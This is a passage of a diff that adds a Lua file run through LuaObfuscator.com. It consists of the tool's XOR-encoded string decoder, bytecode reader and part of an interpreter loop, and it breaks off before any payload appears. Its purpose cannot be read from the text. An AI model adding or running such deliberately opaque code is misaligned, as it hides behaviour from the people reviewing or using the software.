@@ -1,0 +1,1956 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 
+
+]]--
+
+do
+	local v0;
+	local v1;
+	local v2;
+	local v3;
+	local v4;
+	local v5;
+	local v6;
+	local v7;
+	local v8;
+	local v9;
+	local v10;
+	local v11;
+	local v12;
+	local v13;
+	local v14;
+	local v15;
+	local v16;
+	local v17;
+	local v18;
+	local v19;
+	local v20;
+	local v21;
+	local v22;
+	local v23;
+	local v24 = 0;
+	while true do
+		if (v24 == 0) then
+			v0 = string.char;
+			v1 = string.byte;
+			v2 = string.sub;
+			v3 = bit32 or bit;
+			v24 = 1;
+		end
+		if (v24 == 5) then
+			v19 = _G[v7("\182\248\65\114\237", "\198\155\32\30\129\85\186\174")];
+			v20 = _G[v7("\230\243\5\54\126\184", "\149\150\105\83\29\204\65")];
+			v21 = _G[v7("\169\217\149\58\90\11", "\220\183\229\91\57\96\176")] or _G[v7("\107\240\8\22\122", "\31\145\106\122")][v7("\208\214\144\190\8\232", "\165\184\224\223\107\131\131")];
+			v22 = _G[v7("\245\183\141\108\236\186\134\107", "\129\216\227\25")];
+			v24 = 6;
+		end
+		if (v24 == 2) then
+			v7 = function(v28, v29)
+				local v35 = 0;
+				local v36;
+				while true do
+					if (0 == v35) then
+						v36 = {};
+						for v51 = 1, #v28 do
+							v6(v36, v0(v4(v1(v2(v28, v51, v51 + 1)), v1(v2(v29, 1 + ((v51 - 1) % #v29), 1 + ((v51 - 1) % #v29) + 1))) % 256));
+						end
+						v35 = 1;
+					end
+					if (v35 == 1) then
+						return v5(v36);
+					end
+				end
+			end;
+			v8 = _G[v7("\75\172\165\26\119\126\90\177", "\63\195\203\111\26\28")];
+			v9 = _G[v7("\179\40\21\220\80\250", "\192\92\103\181\62\157\217")][v7("\214\211\65\230", "\180\170\53\131\156\94")];
+			v10 = _G[v7("\76\169\60\31\178\88", "\63\221\78\118\220")][v7("\178\142\227\51", "\209\230\130\65\237\99\188")];
+			v24 = 3;
+		end
+		if (v24 == 4) then
+			v15 = _G[v7("\245\50\16\39\167", "\129\83\114\75\194\100\234")][v7("\131\161\233\176\47\88", "\234\207\154\213\93\44")];
+			v16 = _G[v7("\47\128\76\201", "\66\225\56\161\236\193\36\34")][v7("\134\58\234\42\71", "\234\94\143\82\55")];
+			v17 = _G[v7("\85\238\101\199\70\92\253", "\50\139\17\161\35")] or function()
+				return _ENV;
+			end;
+			v18 = _G[v7("\53\137\184\50\85\53\39\152\173\61\92\36", "\70\236\204\95\48\65")];
+			v24 = 5;
+		end
+		if (1 == v24) then
+			v4 = v3.bxor;
+			v5 = table.concat;
+			v6 = table.insert;
+			v7 = nil;
+			v24 = 2;
+		end
+		if (v24 == 3) then
+			v11 = _G[v7("\67\183\54\137\164\32", "\48\195\68\224\202\71\152")][v7("\20\49\17", "\103\68\115\49\201\43")];
+			v12 = _G[v7("\210\35\106\234\195\191", "\161\87\24\131\173\216\156\97")][v7("\222\47\17\213", "\185\92\100\183\18")];
+			v13 = _G[v7("\106\36\179\161\93\126", "\25\80\193\200\51")][v7("\146\227\84", "\224\134\36\97\126\49\184\134")];
+			v14 = _G[v7("\8\238\54\142\80", "\124\143\84\226\53")][v7("\58\248\11\160\52\160", "\89\151\101\195\85\212\32\146")];
+			v24 = 4;
+		end
+		if (v24 == 6) then
+			v23 = nil;
+			v23 = function(v33, v34, ...)
+				local v37 = 0;
+				local v38;
+				local v39;
+				local v40;
+				local v41;
+				local v42;
+				local v43;
+				local v44;
+				local v45;
+				local v46;
+				local v47;
+				local v48;
+				local v49;
+				local v50;
+				while true do
+					if (v37 == 0) then
+						v38 = 0;
+						v39 = nil;
+						v40 = nil;
+						v41 = nil;
+						v37 = 1;
+					end
+					if (v37 == 3) then
+						v50 = nil;
+						while true do
+							local v52 = 0;
+							while true do
+								if (v52 == 1) then
+									if (v38 == 4) then
+										local v53 = 0;
+										while true do
+											if (v53 == 2) then
+												v38 = 5;
+												break;
+											end
+											if (v53 == 1) then
+												v49 = nil;
+												v49 = function()
+													local v67 = 0;
+													local v68;
+													local v69;
+													local v70;
+													local v71;
+													local v72;
+													local v73;
+													local v74;
+													while true do
+														if (v67 == 2) then
+															v72 = nil;
+															v73 = nil;
+															v67 = 3;
+														end
+														if (v67 == 1) then
+															v70 = nil;
+															v71 = nil;
+															v67 = 2;
+														end
+														if (v67 == 3) then
+															v74 = nil;
+															while true do
+																local v116 = 0;
+																while true do
+																	if (v116 == 1) then
+																		if (v68 == 2) then
+																			local v126 = 0;
+																			while true do
+																				if (v126 == 0) then
+																					for v149 = 1 - 0, v73 do
+																						local v150 = 0;
+																						local v151;
+																						local v152;
+																						local v153;
+																						while true do
+																							if (v150 == 0) then
+																								v151 = 0;
+																								v152 = nil;
+																								v150 = 1;
+																							end
+																							if (v150 == 1) then
+																								v153 = nil;
+																								while true do
+																									if (v151 == 0) then
+																										local v176 = 0;
+																										while true do
+																											if (1 == v176) then
+																												v151 = 1;
+																												break;
+																											end
+																											if (v176 == 0) then
+																												v152 = v42();
+																												v153 = nil;
+																												v176 = 1;
+																											end
+																										end
+																									end
+																									if (1 == v151) then
+																										if (v152 == 1) then
+																											v153 = v42() ~= 0;
+																										elseif (v152 == ((4 - 2) + (0 - 0))) then
+																											v153 = v45();
+																										elseif (v152 == ((1281 - (1253 + 26)) + 1 + 0)) then
+																											v153 = v46();
+																										end
+																										v74[v149] = v153;
+																										break;
+																									end
+																								end
+																								break;
+																							end
+																						end
+																					end
+																					v72[(934 + 165) - (672 + 262 + 162)] = v42();
+																					v126 = 1;
+																				end
+																				if (v126 == 1) then
+																					for v154 = 3 - 2, v44() do
+																						local v155 = 0;
+																						local v156;
+																						local v157;
+																						while true do
+																							if (0 == v155) then
+																								v156 = 0;
+																								v157 = nil;
+																								v155 = 1;
+																							end
+																							if (v155 == 1) then
+																								while true do
+																									if (v156 == 0) then
+																										v157 = v42();
+																										if (v41(v157, 323 - (128 + 194), 1) == (0 - 0)) then
+																											local v182 = 0;
+																											local v183;
+																											local v184;
+																											local v185;
+																											local v186;
+																											while true do
+																												if (1 == v182) then
+																													v185 = nil;
+																													v186 = nil;
+																													v182 = 2;
+																												end
+																												if (v182 == 0) then
+																													v183 = 0;
+																													v184 = nil;
+																													v182 = 1;
+																												end
+																												if (v182 == 2) then
+																													while true do
+																														if (v183 == 3) then
+																															if (v41(v185, 136 - (54 + 79), 5 - 2) == (2 - 1)) then
+																																v186[10 - 6] = v74[v186[2 + 0 + 1 + 1]];
+																															end
+																															v69[v154] = v186;
+																															break;
+																														end
+																														if (1 == v183) then
+																															local v202 = 0;
+																															while true do
+																																if (v202 == 1) then
+																																	v183 = 2;
+																																	break;
+																																end
+																																if (0 == v202) then
+																																	v186 = {v43(),v43(),nil,nil};
+																																	if (v184 == (0 + 0)) then
+																																		local v214 = 0;
+																																		local v215;
+																																		while true do
+																																			if (v214 == 0) then
+																																				v215 = 0;
+																																				while true do
+																																					if (0 == v215) then
+																																						v186[3] = v43();
+																																						v186[(2569 - (239 + 393)) - (680 + (2044 - 791))] = v43();
+																																						break;
+																																					end
+																																				end
+																																				break;
+																																			end
+																																		end
+																																	elseif (v184 == 1) then
+																																		v186[1 + 2] = v44();
+																																	elseif (v184 == (2 - 0)) then
+																																		v186[(7332 - 5521) - ((3212 - 1660) + 137 + 119)] = v44() - ((1889 - (357 + 1530)) ^ (56 - 40));
+																																	elseif (v184 == (4 - 1)) then
+																																		local v227 = 0;
+																																		local v228;
+																																		while true do
+																																			if (0 == v227) then
+																																				v228 = 0;
+																																				while true do
+																																					if (0 == v228) then
+																																						v186[5 - 2] = v44() - (2 ^ 16);
+																																						v186[(53 - (4 + 43)) - 2] = v43();
+																																						break;
+																																					end
+																																				end
+																																				break;
+																																			end
+																																		end
+																																	end
+																																	v202 = 1;
+																																end
+																															end
+																														end
+																														if (v183 == 0) then
+																															local v203 = 0;
+																															while true do
+																																if (v203 == 0) then
+																																	v184 = v41(v157, 2 + (0 - 0), 1390 - (906 + 481));
+																																	v185 = v41(v157, 1546 - (1214 + 328), 6 + 0);
+																																	v203 = 1;
+																																end
+																																if (v203 == 1) then
+																																	v183 = 1;
+																																	break;
+																																end
+																															end
+																														end
+																														if (v183 == 2) then
+																															local v204 = 0;
+																															while true do
+																																if (v204 == 0) then
+																																	if (v41(v185, 4 - (1429 - (866 + 560)), 315 - (35 + 279)) == (1 + 0)) then
+																																		v186[1173 - (912 + 259)] = v74[v186[1 + 1]];
+																																	end
+																																	if (v41(v185, 2 + 0, 1 + 1) == (1122 - (843 + 278))) then
+																																		v186[(1 - 0) + 2 + 0] = v74[v186[(1303 - (393 + 906)) - (1 + 0)]];
+																																	end
+																																	v204 = 1;
+																																end
+																																if (v204 == 1) then
+																																	v183 = 3;
+																																	break;
+																																end
+																															end
+																														end
+																													end
+																													break;
+																												end
+																											end
+																										end
+																										break;
+																									end
+																								end
+																								break;
+																							end
+																						end
+																					end
+																					v68 = 3;
+																					break;
+																				end
+																			end
+																		end
+																		if (v68 == 3) then
+																			local v127 = 0;
+																			while true do
+																				if (v127 == 0) then
+																					for v158 = 1 + 0 + 0, v44() do
+																						v70[v158 - ((13 - 9) - (11 - 8))] = v49();
+																					end
+																					for v160 = 1, v44() do
+																						v71[v160] = v44();
+																					end
+																					v127 = 1;
+																				end
+																				if (v127 == 1) then
+																					return v72;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																	if (v116 == 0) then
+																		if (v68 == 0) then
+																			local v128 = 0;
+																			while true do
+																				if (v128 == 0) then
+																					v69 = {};
+																					v70 = {};
+																					v128 = 1;
+																				end
+																				if (v128 == 1) then
+																					v71 = {};
+																					v68 = 1;
+																					break;
+																				end
+																			end
+																		end
+																		if (v68 == 1) then
+																			local v129 = 0;
+																			while true do
+																				if (v129 == 0) then
+																					v72 = {v69,v70,nil,v71};
+																					v73 = v44();
+																					v129 = 1;
+																				end
+																				if (v129 == 1) then
+																					v74 = {};
+																					v68 = 2;
+																					break;
+																				end
+																			end
+																		end
+																		v116 = 1;
+																	end
+																end
+															end
+															break;
+														end
+														if (0 == v67) then
+															v68 = 0;
+															v69 = nil;
+															v67 = 1;
+														end
+													end
+												end;
+												v53 = 2;
+											end
+											if (0 == v53) then
+												v48 = nil;
+												v48 = function(...)
+													return {...}, v20("#", ...);
+												end;
+												v53 = 1;
+											end
+										end
+									end
+									if (v38 == 2) then
+										local v54 = 0;
+										while true do
+											if (1 == v54) then
+												v44 = function()
+													local v75 = 0;
+													local v76;
+													local v77;
+													local v78;
+													local v79;
+													local v80;
+													while true do
+														if (v75 == 0) then
+															v76 = 0;
+															v77 = nil;
+															v75 = 1;
+														end
+														if (v75 == 1) then
+															v78 = nil;
+															v79 = nil;
+															v75 = 2;
+														end
+														if (v75 == 2) then
+															v80 = nil;
+															while true do
+																local v117 = 0;
+																while true do
+																	if (v117 == 0) then
+																		if (v76 == 1) then
+																			return (v80 * ((44773357 - 27995155) - (206 + (1436 - (46 + 610))))) + (v79 * 65536) + (v78 * (22 + 138 + 96)) + v77;
+																		end
+																		if (0 == v76) then
+																			local v130 = 0;
+																			while true do
+																				if (v130 == 0) then
+																					v77, v78, v79, v80 = v9(v33, v39, v39 + (1022 - (389 + 630)) + (1500 - (233 + 1267)));
+																					v39 = v39 + (13 - 9);
+																					v130 = 1;
+																				end
+																				if (v130 == 1) then
+																					v76 = 1;
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																end
+															end
+															break;
+														end
+													end
+												end;
+												v45 = nil;
+												v54 = 2;
+											end
+											if (0 == v54) then
+												v43 = function()
+													local v81 = 0;
+													local v82;
+													local v83;
+													local v84;
+													while true do
+														if (v81 == 1) then
+															v84 = nil;
+															while true do
+																local v118 = 0;
+																while true do
+																	if (v118 == 0) then
+																		if (1 == v82) then
+																			return (v84 * (140 + 116)) + v83;
+																		end
+																		if (v82 == (0 - 0)) then
+																			local v131 = 0;
+																			while true do
+																				if (v131 == 0) then
+																					v83, v84 = v9(v33, v39, v39 + (1121 - (164 + 501 + 243 + (942 - (500 + 231)))));
+																					v39 = v39 + 2 + 0;
+																					v131 = 1;
+																				end
+																				if (v131 == 1) then
+																					v82 = 1 - 0;
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																end
+															end
+															break;
+														end
+														if (v81 == 0) then
+															v82 = 0 - 0;
+															v83 = nil;
+															v81 = 1;
+														end
+													end
+												end;
+												v44 = nil;
+												v54 = 1;
+											end
+											if (v54 == 2) then
+												v38 = 3;
+												break;
+											end
+										end
+									end
+									v52 = 2;
+								end
+								if (v52 == 2) then
+									if (v38 == 1) then
+										local v55 = 0;
+										while true do
+											if (v55 == 0) then
+												v41 = function(v59, v60, v61)
+													if v61 then
+														local v105 = 0;
+														local v106;
+														local v107;
+														while true do
+															if (v105 == 0) then
+																v106 = 0 - 0;
+																v107 = nil;
+																v105 = 1;
+															end
+															if (v105 == 1) then
+																while true do
+																	if ((0 - 0) == v106) then
+																		local v123 = 0;
+																		while true do
+																			if (v123 == 0) then
+																				v107 = (v59 / ((1 + 0 + (1 - 0)) ^ (v60 - (2 - (1 - 0))))) % (((278 - (25 + 74 + 175)) - (841 - (144 + 518 + (297 - 120)))) ^ (((v61 - (1 - 0)) - (v60 - ((280 - ((634 - 364) + (27 - 20))) - (1459 - ((777 - 577) + (1858 - (149 + 452))))))) + ((2944 - (158 + 1653)) - (448 + 684))));
+																				return v107 - (v107 % ((1 + 0) - ((0 + 0) - 0)));
+																			end
+																		end
+																	end
+																end
+																break;
+															end
+														end
+													else
+														local v108 = 0;
+														local v109;
+														local v110;
+														while true do
+															if (v108 == 0) then
+																v109 = 0;
+																v110 = nil;
+																v108 = 1;
+															end
+															if (v108 == 1) then
+																while true do
+																	if (v109 == (0 + 0)) then
+																		local v124 = 0;
+																		while true do
+																			if (v124 == 0) then
+																				v110 = 2 ^ (v60 - ((347 + (1997 - (756 + 885))) - (586 + (299 - (13 + 170)))));
+																				return (((v59 % (v110 + v110)) >= v110) and ((1858 - (199 + 1658)) - 0)) or (((548 + 405) - (329 + 158 + 356)) - (6 + 10 + 13 + ((1114 - 393) - (323 + 317))));
+																			end
+																		end
+																	end
+																end
+																break;
+															end
+														end
+													end
+												end;
+												v42 = nil;
+												v55 = 1;
+											end
+											if (v55 == 2) then
+												v38 = 2;
+												break;
+											end
+											if (v55 == 1) then
+												v42 = function()
+													local v85 = 0;
+													local v86;
+													local v87;
+													while true do
+														if (v85 == 1) then
+															while true do
+																local v119 = 0;
+																while true do
+																	if (v119 == 0) then
+																		if (v86 == 1) then
+																			return v87;
+																		end
+																		if ((0 + 0) == v86) then
+																			local v132 = 0;
+																			while true do
+																				if (v132 == 0) then
+																					v87 = v9(v33, v39, v39);
+																					v39 = v39 + 1 + (0 - 0);
+																					v132 = 1;
+																				end
+																				if (1 == v132) then
+																					v86 = 1;
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																end
+															end
+															break;
+														end
+														if (v85 == 0) then
+															v86 = 0;
+															v87 = nil;
+															v85 = 1;
+														end
+													end
+												end;
+												v43 = nil;
+												v55 = 2;
+											end
+										end
+									end
+									if (v38 == 0) then
+										local v56 = 0;
+										while true do
+											if (v56 == 1) then
+												v33 = v12(v11(v33, 1696 - (210 + 1481)), v7("\105\234", "\71\196\51\144\71"), function(v62)
+													if (v9(v62, 1 + 1) == ((211 + 49) - (81 + 100))) then
+														local v111 = 0;
+														local v112;
+														while true do
+															if (v111 == 0) then
+																v112 = 0;
+																while true do
+																	if (v112 == 0) then
+																		local v125 = 0;
+																		while true do
+																			if (v125 == 0) then
+																				v40 = v8(v11(v62, (2 - 1) + 0, 729 - (123 + 605)));
+																				return "";
+																			end
+																		end
+																	end
+																end
+																break;
+															end
+														end
+													else
+														local v113 = 0;
+														local v114;
+														local v115;
+														while true do
+															if (0 == v113) then
+																v114 = 0;
+																v115 = nil;
+																v113 = 1;
+															end
+															if (v113 == 1) then
+																while true do
+																	if (v114 == 0) then
+																		v115 = v10(v8(v62, 16));
+																		if v40 then
+																			local v142 = 0;
+																			local v143;
+																			local v144;
+																			while true do
+																				if (v142 == 0) then
+																					v143 = 0;
+																					v144 = nil;
+																					v142 = 1;
+																				end
+																				if (1 == v142) then
+																					while true do
+																						local v171 = 0;
+																						while true do
+																							if (v171 == 0) then
+																								if (v143 == 0) then
+																									local v178 = 0;
+																									while true do
+																										if (v178 == 0) then
+																											v144 = v13(v115, v40);
+																											v40 = nil;
+																											v178 = 1;
+																										end
+																										if (v178 == 1) then
+																											v143 = 1;
+																											break;
+																										end
+																									end
+																								end
+																								if (v143 == 1) then
+																									return v144;
+																								end
+																								break;
+																							end
+																						end
+																					end
+																					break;
+																				end
+																			end
+																		else
+																			return v115;
+																		end
+																		break;
+																	end
+																end
+																break;
+															end
+														end
+													end
+												end);
+												v41 = nil;
+												v56 = 2;
+											end
+											if (v56 == 0) then
+												v39 = (2 - 0) - 1;
+												v40 = nil;
+												v56 = 1;
+											end
+											if (v56 == 2) then
+												v38 = 1;
+												break;
+											end
+										end
+									end
+									break;
+								end
+								if (0 == v52) then
+									if (3 == v38) then
+										local v57 = 0;
+										while true do
+											if (v57 == 2) then
+												v38 = 4;
+												break;
+											end
+											if (v57 == 1) then
+												v46 = function(v63)
+													local v88 = 0;
+													local v89;
+													local v90;
+													local v91;
+													while true do
+														if (v88 == 0) then
+															v89 = 0;
+															v90 = nil;
+															v88 = 1;
+														end
+														if (v88 == 1) then
+															v91 = nil;
+															while true do
+																local v120 = 0;
+																while true do
+																	if (v120 == 1) then
+																		if (v89 == 3) then
+																			return v14(v91);
+																		end
+																		if (v89 == 0) then
+																			local v133 = 0;
+																			while true do
+																				if (v133 == 0) then
+																					v90 = nil;
+																					if not v63 then
+																						local v172 = 0;
+																						local v173;
+																						while true do
+																							if (0 == v172) then
+																								v173 = 0;
+																								while true do
+																									if (v173 == 0) then
+																										v63 = v44();
+																										if (v63 == (0 + 0)) then
+																											return "";
+																										end
+																										break;
+																									end
+																								end
+																								break;
+																							end
+																						end
+																					end
+																					v133 = 1;
+																				end
+																				if (v133 == 1) then
+																					v89 = 358 - (98 + 259);
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																	if (v120 == 0) then
+																		if (v89 == (7 - 5)) then
+																			local v134 = 0;
+																			while true do
+																				if (v134 == 1) then
+																					v89 = 3;
+																					break;
+																				end
+																				if (0 == v134) then
+																					v91 = {};
+																					for v162 = 1 - (0 + 0), #v90 do
+																						v91[v162] = v10(v9(v11(v90, v162, v162)));
+																					end
+																					v134 = 1;
+																				end
+																			end
+																		end
+																		if (v89 == (27 - (7 + 19))) then
+																			local v135 = 0;
+																			while true do
+																				if (v135 == 0) then
+																					v90 = v11(v33, v39, (v39 + v63) - ((509 - (166 + 342)) - 0));
+																					v39 = v39 + v63;
+																					v135 = 1;
+																				end
+																				if (1 == v135) then
+																					v89 = 2;
+																					break;
+																				end
+																			end
+																		end
+																		v120 = 1;
+																	end
+																end
+															end
+															break;
+														end
+													end
+												end;
+												v47 = v44;
+												v57 = 2;
+											end
+											if (v57 == 0) then
+												v45 = function()
+													local v92 = 0;
+													local v93;
+													local v94;
+													local v95;
+													local v96;
+													local v97;
+													local v98;
+													local v99;
+													while true do
+														if (v92 == 2) then
+															v97 = nil;
+															v98 = nil;
+															v92 = 3;
+														end
+														if (v92 == 0) then
+															v93 = 0 - 0;
+															v94 = nil;
+															v92 = 1;
+														end
+														if (v92 == 1) then
+															v95 = nil;
+															v96 = nil;
+															v92 = 2;
+														end
+														if (v92 == 3) then
+															v99 = nil;
+															while true do
+																local v121 = 0;
+																while true do
+																	if (1 == v121) then
+																		if (v93 == (1 + 0)) then
+																			local v136 = 0;
+																			while true do
+																				if (v136 == 0) then
+																					v96 = 1 + 0;
+																					v97 = (v41(v95, (291 - (278 + 11)) - 1, (39 - 10) - 9) * ((8 - (56 - (41 + (13 - 4)))) ^ ((694 - (93 + 98)) - (134 + 337)))) + v94;
+																					v136 = 1;
+																				end
+																				if (v136 == 1) then
+																					v93 = 2;
+																					break;
+																				end
+																			end
+																		end
+																		if (v93 == 3) then
+																			local v137 = 0;
+																			while true do
+																				if (0 == v137) then
+																					if (v98 == ((0 - 0) - (0 - (0 - 0)))) then
+																						if (v97 == ((0 - 0) + 0)) then
+																							return v99 * (0 + 0);
+																						else
+																							local v174 = 0;
+																							local v175;
+																							while true do
+																								if (0 == v174) then
+																									v175 = 0 + 0;
+																									while true do
+																										if (v175 == (0 + 0)) then
+																											v98 = 1 + 0 + 0;
+																											v96 = 0 - (0 - 0);
+																											break;
+																										end
+																									end
+																									break;
+																								end
+																							end
+																						end
+																					elseif (v98 == ((104 + 2328) - (328 + 28 + 7 + (71 - 49)))) then
+																						return ((v97 == ((430 - (82 + 348)) - 0)) and (v99 * ((1200 - (490 + 709)) / ((0 - 0) - (0 - 0))))) or (v99 * NaN);
+																					end
+																					return v16(v99, v98 - ((345 + 908) - (498 - 268))) * (v96 + (v97 / (2 ^ ((186 - 72) - (32 + 30)))));
+																				end
+																			end
+																		end
+																		break;
+																	end
+																	if (v121 == 0) then
+																		if (v93 == (0 - 0)) then
+																			local v138 = 0;
+																			while true do
+																				if (v138 == 1) then
+																					v93 = 1;
+																					break;
+																				end
+																				if (v138 == 0) then
+																					v94 = v44();
+																					v95 = v44();
+																					v138 = 1;
+																				end
+																			end
+																		end
+																		if (v93 == (7 - 5)) then
+																			local v139 = 0;
+																			while true do
+																				if (v139 == 1) then
+																					v93 = 3;
+																					break;
+																				end
+																				if (v139 == 0) then
+																					v98 = v41(v95, 58 - 37, 662 - ((1969 - (69 + 1731)) + 462));
+																					v99 = ((v41(v95, 1410 - (((1876 - (602 + 195)) - 306) + 591 + 14)) == (1 + 0)) and -(1 + 0)) or (1 - 0);
+																					v139 = 1;
+																				end
+																			end
+																		end
+																		v121 = 1;
+																	end
+																end
+															end
+															break;
+														end
+													end
+												end;
+												v46 = nil;
+												v57 = 1;
+											end
+										end
+									end
+									if (v38 == 5) then
+										local v58 = 0;
+										while true do
+											if (v58 == 1) then
+												return v50(v49(), {}, v34)(...);
+											end
+											if (v58 == 0) then
+												v50 = nil;
+												v50 = function(v64, v65, v66)
+													local v100 = 0;
+													local v101;
+													local v102;
+													local v103;
+													local v104;
+													while true do
+														if (v100 == 0) then
+															v101 = 0;
+															v102 = nil;
+															v100 = 1;
+														end
+														if (v100 == 1) then
+															v103 = nil;
+															v104 = nil;
+															v100 = 2;
+														end
+														if (v100 == 2) then
+															while true do
+																local v122 = 0;
+																while true do
+																	if (v122 == 0) then
+																		if (v101 == 1) then
+																			local v140 = 0;
+																			while true do
+																				if (0 == v140) then
+																					v104 = v64[4 - 1];
+																					return function(...)
+																						local v164 = 0;
+																						local v165;
+																						local v166;
+																						local v167;
+																						local v168;
+																						local v169;
+																						local v170;
+																						while true do
+																							if (v164 == 3) then
+																								while true do
+																									if (1 == v165) then
+																										local v179 = 0;
+																										while true do
+																											if (v179 == 0) then
+																												v168 = {...};
+																												v169 = v20("#", ...) - 1;
+																												v179 = 1;
+																											end
+																											if (v179 == 1) then
+																												v165 = 2;
+																												break;
+																											end
+																										end
+																									end
+																									if (v165 == 3) then
+																										_G['A'], _G['B'] = v48(v19(v170));
+																										if not _G['A'][(231 - (98 + 131)) - (2 - 1)] then
+																											local v187 = 0;
+																											local v188;
+																											local v189;
+																											while true do
+																												if (v187 == 0) then
+																													v188 = 0;
+																													v189 = nil;
+																													v187 = 1;
+																												end
+																												if (v187 == 1) then
+																													while true do
+																														if (v188 == 0) then
+																															v189 = v64[15 - 11][v166] or "?";
+																															error(v7("\35\164\16\165\43\81\25\27\2\181\13\190\123\68\77\94\43", "\112\199\98\204\91\37\57\126") .. v189 .. v7("\145\209", "\204\235\235\229\231\50\95\86") .. _G['A'][(174 - (131 + 38)) - (2 + 1)]);
+																															break;
+																														end
+																													end
+																													break;
+																												end
+																											end
+																										else
+																											return v21(_G['A'], (213 - (27 + 185)) + (2 - 1), _G['B']);
+																										end
+																										break;
+																									end
+																									if (v165 == 0) then
+																										local v180 = 0;
+																										while true do
+																											if (v180 == 1) then
+																												v165 = 1;
+																												break;
+																											end
+																											if (v180 == 0) then
+																												v166 = (1431 - 741) - ((781 - 515) + 423);
+																												v167 = -(1696 - (823 + 66 + (1618 - (603 + 209))));
+																												v180 = 1;
+																											end
+																										end
+																									end
+																									if (v165 == 2) then
+																										local v181 = 0;
+																										while true do
+																											if (v181 == 1) then
+																												v165 = 3;
+																												break;
+																											end
+																											if (v181 == 0) then
+																												v170 = nil;
+																												v170 = function()
+																													local v190 = 0;
+																													local v191;
+																													local v192;
+																													local v193;
+																													local v194;
+																													local v195;
+																													local v196;
+																													local v197;
+																													local v198;
+																													local v199;
+																													local v200;
+																													while true do
+																														if (v190 == 2) then
+																															v198 = (v169 - v193) + (1 - 0);
+																															v199 = nil;
+																															v200 = nil;
+																															while true do
+																																local v205 = 0;
+																																local v206;
+																																while true do
+																																	if (v205 == 0) then
+																																		v206 = 0;
+																																		while true do
+																																			if (v206 == 1) then
+																																				if (v200 <= (8 + 6)) then
+																																					if (v200 <= (18 - 12)) then
+																																						if (v200 <= (164 - (95 + 67))) then
+																																							if (v200 <= 0) then
+																																								v197[v199[(1815 - (141 + 18)) - (1473 + 45 + 136)]] = v66[v199[836 - (149 + 684)]];
+																																							elseif (v200 == (1 + 0)) then
+																																								local v234 = 0;
+																																								local v235;
+																																								local v236;
+																																								local v237;
+																																								while true do
+																																									if (v234 == 0) then
+																																										v235 = 0;
+																																										v236 = nil;
+																																										v234 = 1;
+																																									end
+																																									if (1 == v234) then
+																																										v237 = nil;
+																																										while true do
+																																											if (v235 == 0) then
+																																												local v306 = 0;
+																																												while true do
+																																													if (v306 == 0) then
+																																														v236 = v199[2];
+																																														v237 = v197[v199[3]];
+																																														v306 = 1;
+																																													end
+																																													if (v306 == 1) then
+																																														v235 = 1;
+																																														break;
+																																													end
+																																												end
+																																											end
+																																											if (v235 == 1) then
+																																												v197[v236 + (2 - 1)] = v237;
+																																												v197[v236] = v237[v199[6 - (1849 - (642 + 1205))]];
+																																												break;
+																																											end
+																																										end
+																																										break;
+																																									end
+																																								end
+																																							else
+																																								local v238 = 0;
+																																								local v239;
+																																								local v240;
+																																								local v241;
+																																								local v242;
+																																								local v243;
+																																								while true do
+																																									if (v238 == 1) then
+																																										v241 = nil;
+																																										v242 = nil;
+																																										v238 = 2;
+																																									end
+																																									if (v238 == 2) then
+																																										v243 = nil;
+																																										while true do
+																																											if (v239 == 1) then
+																																												local v310 = 0;
+																																												while true do
+																																													if (v310 == 1) then
+																																														v239 = 2;
+																																														break;
+																																													end
+																																													if (v310 == 0) then
+																																														v167 = (v242 + v240) - (499 - (61 + (606 - 169)));
+																																														v243 = 0;
+																																														v310 = 1;
+																																													end
+																																												end
+																																											end
+																																											if (0 == v239) then
+																																												local v311 = 0;
+																																												while true do
+																																													if (0 == v311) then
+																																														v240 = v199[1 + 1 + 0];
+																																														v241, v242 = v194(v197[v240](v197[v240 + 1]));
+																																														v311 = 1;
+																																													end
+																																													if (1 == v311) then
+																																														v239 = 1;
+																																														break;
+																																													end
+																																												end
+																																											end
+																																											if (v239 == 2) then
+																																												for v329 = v240, v167 do
+																																													local v330 = 0;
+																																													local v331;
+																																													while true do
+																																														if (v330 == 0) then
+																																															v331 = 0;
+																																															while true do
+																																																if (v331 == 0) then
+																																																	v243 = v243 + ((3 + 0) - (1851 - (1718 + 131)));
+																																																	v197[v329] = v241[v243];
+																																																	break;
+																																																end
+																																															end
+																																															break;
+																																														end
+																																													end
+																																												end
+																																												break;
+																																											end
+																																										end
+																																										break;
+																																									end
+																																									if (v238 == 0) then
+																																										v239 = 0;
+																																										v240 = nil;
+																																										v238 = 1;
+																																									end
+																																								end
+																																							end
+																																						elseif (v200 <= (1 + 3)) then
+																																							if (v200 > (1690 - (743 + 944))) then
+																																								v197[v199[(1 + 3) - (4 - 2)]] = {};
+																																							else
+																																								local v245 = 0;
+																																								local v246;
+																																								local v247;
+																																								while true do
+																																									if (v245 == 0) then
+																																										v246 = 0;
+																																										v247 = nil;
+																																										v245 = 1;
+																																									end
+																																									if (v245 == 1) then
+																																										while true do
+																																											if (v246 == 0) then
+																																												v247 = v199[(6 + 1) - 5];
+																																												do
+																																													return v21(v197, v247, v167);
+																																												end
+																																												break;
+																																											end
+																																										end
+																																										break;
+																																									end
+																																								end
+																																							end
+																																						elseif (v200 > (1771 - (204 + 1562))) then
+																																							local v248 = 0;
+																																							local v249;
+																																							local v250;
+																																							while true do
+																																								if (v248 == 0) then
+																																									v249 = 0;
+																																									v250 = nil;
+																																									v248 = 1;
+																																								end
+																																								if (v248 == 1) then
+																																									while true do
+																																										if (v249 == 0) then
+																																											v250 = v199[2];
+																																											do
+																																												return v197[v250](v21(v197, v250 + 1, v199[251 - (113 + 135)]));
+																																											end
+																																											break;
+																																										end
+																																									end
+																																									break;
+																																								end
+																																							end
+																																						else
+																																							local v251 = 0;
+																																							local v252;
+																																							local v253;
+																																							local v254;
+																																							local v255;
+																																							while true do
+																																								if (v251 == 1) then
